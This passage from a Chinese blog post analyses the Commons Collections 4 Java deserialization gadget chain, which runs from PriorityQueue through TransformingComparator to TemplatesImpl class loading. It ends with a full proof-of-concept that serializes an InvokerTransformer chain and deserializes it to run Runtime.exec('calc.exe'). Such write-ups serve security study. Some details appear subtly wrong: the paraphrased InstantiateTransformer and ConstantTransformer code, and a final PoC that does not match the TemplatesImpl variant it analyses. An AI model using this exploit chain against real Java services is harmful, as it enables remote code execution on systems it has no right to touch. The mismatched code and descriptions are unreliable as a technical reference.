class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>关键细节</strong>：</p>
+<ul>
+<li>
+<p>transformer是我们构造的ChainedTransformer实例（包含恶意转换逻辑）</p>
+</li>
+<li>
+<p>o1和o2是PriorityQueue中的元素（如&quot;a&quot;和&quot;b&quot;），其实际值无关紧要，仅作为触发transform的 “载体”</p>
+</li>
+<li>
+<p>每次compare调用会执行两次transform（分别针对o1和o2），意味着转换链会被触发两次</p>
+</li>
+<li>
+<p>decorated通常使用默认的ComparableComparator，确保比较操作不会抛出异常中断流程</p>
+</li>
+</ul>
+<h3 id="四、转换链执行：ChainedTransformer-的-transform-方法">四、转换链执行：ChainedTransformer 的 transform 方法</h3>
+<p>ChainedTransformer负责按顺序执行多个转换器，将分散的转换逻辑串联成完整链条：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">Transformer</span>&lt;T, T&gt;, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> T, ? <span class="keyword">extends</span> <span class="title class_">T</span>&gt;[] transformers; <span class="comment">// 转换器数组</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">transform</span><span class="params">(T object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Transformer&lt;? <span class="built_in">super</span> T, ? <span class="keyword">extends</span> <span class="title class_">T</span>&gt; transformer : transformers) &#123;</span><br><span class="line">            object = transformer.transform(object); <span class="comment">// 依次执行转换</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>执行机制</strong>：</p>
+<ul>
+<li>
+<p>转换器数组按顺序执行，前一个转换器的输出作为后一个的输入</p>
+</li>
+<li>
+<p>在 CC4（TemplatesImpl 变种）中，数组通常包含两个转换器：ConstantTransformer和InstantiateTransformer</p>
+</li>
+<li>
+<p>整个链条的输入是PriorityQueue的元素（如&quot;a&quot;），但第一个转换器会忽略输入，返回预设的恶意对象</p>
+</li>
+</ul>
+<h3 id="五、转换器链：从-ConstantTransformer-到-InstantiateTransformer">五、转换器链：从 ConstantTransformer 到 InstantiateTransformer</h3>
+<h4 id="1-ConstantTransformer：返回预设的恶意对象">1. ConstantTransformer：返回预设的恶意对象</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformer</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">Transformer</span>&lt;T, T&gt;, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> T iConstant; <span class="comment">// 预设常量</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">transform</span><span class="params">(T input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant; <span class="comment">// 忽略输入，返回预设值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>在链条中的作用</strong>：</p>
+<ul>
+<li>
+<p>我们构造时传入TemplatesImpl实例（包含恶意字节码）作为iConstant</p>
+</li>
+<li>
+<p>无论输入是&quot;a&quot;还是&quot;b&quot;，均返回预设的TemplatesImpl对象</p>
+</li>
+<li>
+<p>这一步的目的是将后续转换逻辑的处理对象切换为TemplatesImpl</p>
+</li>
+</ul>
+<h4 id="2-InstantiateTransformer：实例化-TrAXFilter">2. InstantiateTransformer：实例化 TrAXFilter</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InstantiateTransformer</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">Transformer</span>&lt;T, T&gt;, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;?&gt;[] iParamTypes; <span class="comment">// 构造函数参数类型</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs; <span class="comment">// 构造函数参数值</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">transform</span><span class="params">(T input)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// input是上一步返回的TemplatesImpl实例</span></span><br><span class="line">            Class&lt;?&gt; cls = TrAXFilter.class;</span><br><span class="line">            Constructor&lt;?&gt; con = cls.getConstructor(iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> (T) con.newInstance(iArgs); <span class="comment">// 实例化TrAXFilter</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>关键配置</strong>：</p>
+<ul>
+<li>
+<p>iParamTypes设置为{Templates.class}（TrAXFilter 的构造函数参数类型）</p>
+</li>
+<li>
+<p>iArgs设置为{input}（即ConstantTransformer返回的TemplatesImpl实例）</p>
+</li>
+<li>
+<p>核心操作：通过反射调用TrAXFilter的构造函数，传入恶意TemplatesImpl</p>
+</li>
+</ul>
+<h3 id="六、代码执行触发：从-TrAXFilter-到-TemplatesImpl">六、代码执行触发：从 TrAXFilter 到 TemplatesImpl</h3>
+<h4 id="1-TrAXFilter-的构造函数：触发-TemplatesImpl-的方法">1. TrAXFilter 的构造函数：触发 TemplatesImpl 的方法</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrAXFilter</span> <span class="keyword">extends</span> <span class="title class_">XMLFilterImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="comment">// 调用Templates的newTransformer()方法</span></span><br><span class="line">        _transformer = templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>关键作用</strong>：</p>
+<ul>
+<li>
+<p>构造函数接收Templates类型参数（实际是我们的TemplatesImpl实例）</p>
+</li>
+<li>
+<p>必然调用templates.newTransformer()，这是触发TemplatesImpl恶意逻辑的关键一步</p>
+</li>
+</ul>
+<h4 id="2-TemplatesImpl-的-newTransformer-：启动类加载流程">2. TemplatesImpl 的 newTransformer ()：启动类加载流程</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title class_">Templates</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> TransformerFactoryImpl _tfactory;</span><br><span class="line">    <span class="keyword">private</span> String _version;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes; <span class="comment">// 存储恶意类的字节码</span></span><br><span class="line">    <span class="keyword">private</span> String _transletName; <span class="comment">// 主类名</span></span><br><span class="line">    <span class="keyword">private</span> Class[] _class; <span class="comment">// 加载后的类对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> _outputProperties;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> _instantiated;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="comment">// 获取translet实例（核心方法）</span></span><br><span class="line">        <span class="type">Translet</span> <span class="variable">t</span> <span class="operator">=</span> getTransletInstance();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建并返回Transformer实例（次要操作）</span></span><br><span class="line">        <span class="type">TransformerImpl</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(t, _outputProperties, _tfactory);</span><br><span class="line">        <span class="keyword">return</span> transformer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>关键逻辑</strong>：</p>
+<ul>
+<li>
+<p>newTransformer()的核心是调用getTransletInstance()获取 translet 实例</p>
+</li>
+<li>
+<p>_bytecodes需预先设置为恶意类的字节码（如包含static{Runtime.getRuntime().exec(“calc.exe”);}的类）</p>
+</li>
+<li>
+<p>_transletName需设置为恶意类的类名，确保能正确加载</p>
+</li>
+</ul>
+<h4 id="3-getTransletInstance-：检查并加载类">3. getTransletInstance ()：检查并加载类</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">if</span> (_class == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 定义translet类（加载字节码）</span></span><br><span class="line">        defineTransletClasses();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 实例化主translet类</span></span><br><span class="line">        <span class="keyword">return</span> (Translet) _class[<span class="number">0</span>].newInstance();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>触发条件</strong>：</p>
+<ul>
+<li>
+<p>当_class为 null 时（首次调用），会执行defineTransletClasses()加载字节码</p>
+</li>
+<li>
+<p>加载成功后实例化主类，此时静态代码块会被执行（恶意代码触发点）</p>
+</li>
+</ul>
+<h4 id="4-defineTransletClasses-：使用自定义类加载器加载字节码">4. defineTransletClasses ()：使用自定义类加载器加载字节码</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(<span class="string">&quot;No translet bytes&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建自定义类加载器（继承ClassLoader）</span></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(</span><br><span class="line">        Thread.currentThread().getContextClassLoader());</span><br><span class="line">    </span><br><span class="line">    _class = <span class="keyword">new</span> <span class="title class_">Class</span>[_bytecodes.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; _bytecodes.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 加载字节码到JVM</span></span><br><span class="line">        _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 检查是否是AbstractTranslet的子类（必要条件）</span></span><br><span class="line">        <span class="keyword">if</span> (!AbstractTranslet.class.isAssignableFrom(_class[i])) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(<span class="string">&quot;Not a Translet&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>核心操作</strong>：</p>
+<ul>
+<li>
+<p>创建TransletClassLoader（可加载任意字节码，无安全检查）</p>
+</li>
+<li>
+<p>调用loader.defineClass(_bytecodes[i])将字节码转换为 Class 对象</p>
+</li>
+<li>
+<p>要求恶意类必须继承AbstractTranslet（否则会抛出异常中断流程）</p>
+</li>
+<li>
+<p>字节码加载后，类的静态代码块会立即执行（执行恶意命令）</p>
+</li>
+</ul>
+<h4 id="5-TransletClassLoader-的-defineClass：完成字节码加载">5. TransletClassLoader 的 defineClass：完成字节码加载</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TransletClassLoader</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Class <span class="title function_">defineClass</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">        <span class="comment">// 调用ClassLoader的defineClass方法加载字节码</span></span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>关键特性</strong>：</p>
+<ul>
+<li>
+<p>继承自ClassLoader，并重写defineClass方法简化字节码加载</p>
+</li>
+<li>
+<p>无任何安全验证，直接将字节数组转换为 Class 对象</p>
+</li>
+<li>
+<p>这一步是恶意代码能够被 JVM 加载并执行的最终保障</p>
+</li>
+</ul>
+<h3 id="七、完整调用链总结">七、完整调用链总结</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">└── PriorityQueue.readObject()</span><br><span class="line">    ├── 恢复comparator（TransformingComparator）和队列元素</span><br><span class="line">    └── PriorityQueue.heapify()</span><br><span class="line">        └── PriorityQueue.siftDown()</span><br><span class="line">            └── PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                └── TransformingComparator.compare()</span><br><span class="line">                    ├── ChainedTransformer.transform()</span><br><span class="line">                    │   ├── ConstantTransformer.transform() → 返回TemplatesImpl</span><br><span class="line">                    │   └── InstantiateTransformer.transform()</span><br><span class="line">                    │       └── TrAXFilter.&lt;init&gt;(TemplatesImpl)</span><br><span class="line">                    │           └── TemplatesImpl.newTransformer()</span><br><span class="line">                    │               └── TemplatesImpl.getTransletInstance()</span><br><span class="line">                    │                   └── TemplatesImpl.defineTransletClasses()</span><br><span class="line">                    │                       └── TransletClassLoader.defineClass()</span><br><span class="line">                    │                           └── 加载恶意字节码 → 执行静态代码块</span><br><span class="line">                    └── （第二次转换：处理第二个元素，流程相同）</span><br></pre></td></tr></table></figure>
+<h3 id="八、关键触发条件">八、关键触发条件</h3>
+<ol>
+<li>
+<p><strong>序列化支持</strong>：所有涉及的类（PriorityQueue、TransformingComparator、ChainedTransformer、TemplatesImpl等）必须实现Serializable接口，且关键字段（如_bytecodes）不能被transient修饰。</p>
+</li>
+<li>
+<p><strong>队列元素数量</strong>：PriorityQueue必须包含至少 2 个元素，确保heapify()能执行siftDownUsingComparator并触发compare调用。</p>
+</li>
+<li>
+<p><strong>TemplatesImpl 配置</strong>：</p>
+</li>
+</ol>
+<ul>
+<li>
+<p>_bytecodes必须包含继承AbstractTranslet的恶意类字节码</p>
+</li>
+<li>
+<p>_transletName需正确设置为恶意类名</p>
+</li>
+<li>
+<p>_tfactory可为 null（不影响核心流程）</p>
+</li>
+</ul>
+<ol>
+<li><strong>转换器链顺序</strong>：ChainedTransformer中的转换器必须按ConstantTransformer → InstantiateTransformer的顺序排列，确保类型传递正确。</li>
+</ol>
+<p>通过以上分析可见，CC4 链（TemplatesImpl 变种）巧妙利用了 Java 集合框架的反序列化行为、比较器的转换机制以及 Xalan 库中TemplatesImpl的类加载逻辑，将多个看似无关的组件串联成完整的代码执行链，是 Java 反序列化漏洞利用的经典案例。</p>
+<h2 id="代码">代码</h2>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ==================== 构建Transformer执行链 ====================</span></span><br><span class="line">        <span class="comment">// 这个链式Transformer会按顺序执行以下操作：</span></span><br><span class="line">        <span class="comment">// 1. 获取Runtime.class对象</span></span><br><span class="line">        <span class="comment">// 2. 获取Runtime.getRuntime()方法</span></span><br><span class="line">        <span class="comment">// 3. 调用getRuntime()获取Runtime实例</span></span><br><span class="line">        <span class="comment">// 4. 调用exec()执行命令</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="comment">// 第一步：无论输入什么，都返回Runtime.class对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 第二步：通过反射调用Class.getMethod()获取Runtime.getRuntime()方法</span></span><br><span class="line">                <span class="comment">// 参数说明：</span></span><br><span class="line">                <span class="comment">// &quot;getMethod&quot; - 要调用的方法名</span></span><br><span class="line">                <span class="comment">// new Class[] &#123;String.class, Class[].class&#125; - getMethod的参数类型</span></span><br><span class="line">                <span class="comment">// new Object[] &#123;&quot;getRuntime&quot;, new Class[0]&#125; - getMethod的参数值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 第三步：通过反射调用Method.invoke()执行getRuntime()方法</span></span><br><span class="line">                <span class="comment">// 参数说明：</span></span><br><span class="line">                <span class="comment">// &quot;invoke&quot; - 要调用的方法名</span></span><br><span class="line">                <span class="comment">// new Class[] &#123;Object.class, Object[].class&#125; - invoke的参数类型</span></span><br><span class="line">                <span class="comment">// new Object[] &#123;null, new Object[0]&#125; - invoke的参数值(null表示静态方法)</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 第四步：通过反射调用Runtime.exec()执行命令</span></span><br><span class="line">                <span class="comment">// 参数说明：</span></span><br><span class="line">                <span class="comment">// &quot;exec&quot; - 要调用的方法名</span></span><br><span class="line">                <span class="comment">// new Class[] &#123;String.class&#125; - exec的参数类型</span></span><br><span class="line">                <span class="comment">// new Object[] &#123;&quot;calc.exe&quot;&#125; - 要执行的命令</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将多个Transformer组合成链式Transformer</span></span><br><span class="line">        <span class="comment">// 执行时会按数组顺序依次调用每个Transformer的transform方法</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================== 构造PriorityQueue触发点 ====================</span></span><br><span class="line">        <span class="comment">// 创建带有转换功能的比较器，将比较操作转换为Transformer链的执行</span></span><br><span class="line">        <span class="comment">// 这个比较器会在比较两个对象时触发我们的恶意Transformer链</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建PriorityQueue并设置我们构造的比较器</span></span><br><span class="line">        <span class="comment">// 参数2表示初始容量，必须至少为2才能触发后续的堆调整操作</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加两个元素到队列中，这会触发一次比较操作</span></span><br><span class="line">        <span class="comment">// 但此时还未触发漏洞，因为还没有进行堆调整(heapify)</span></span><br><span class="line">        queue.add(<span class="number">1</span>); <span class="comment">// 第一个元素，可以是任意值</span></span><br><span class="line">        queue.add(<span class="number">2</span>); <span class="comment">// 第二个元素，可以是任意值</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================== 序列化操作 ====================</span></span><br><span class="line">        <span class="comment">// 将构造好的PriorityQueue序列化为字节数组</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteOut);</span><br><span class="line">        objOut.writeObject(queue);</span><br><span class="line">        objOut.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================== 反序列化触发漏洞 ====================</span></span><br><span class="line">        <span class="comment">// 当反序列化PriorityQueue时，会执行以下关键步骤：</span></span><br><span class="line">        <span class="comment">// 1. 调用PriorityQueue.readObject()方法</span></span><br><span class="line">        <span class="comment">// 2. readObject()会调用heapify()重建堆结构</span></span><br><span class="line">        <span class="comment">// 3. heapify()会调用siftDown()进行堆调整</span></span><br><span class="line">        <span class="comment">// 4. siftDown()会调用我们设置的TransformingComparator.compare()</span></span><br><span class="line">        <span class="comment">// 5. compare()会触发ChainedTransformer执行恶意代码</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteOut.toByteArray()));</span><br><span class="line">        objIn.readObject(); <span class="comment">// 这里会触发漏洞</span></span><br><span class="line">        objIn.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="子非鱼 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="子非鱼 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/10/09/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BCC2%E9%93%BE%E5%88%86%E6%9E%90/" rel="prev" title="Java安全之CC2链分析">
+                  <i class="fa fa-angle-left"></i> Java安全之CC2链分析
+                </a>
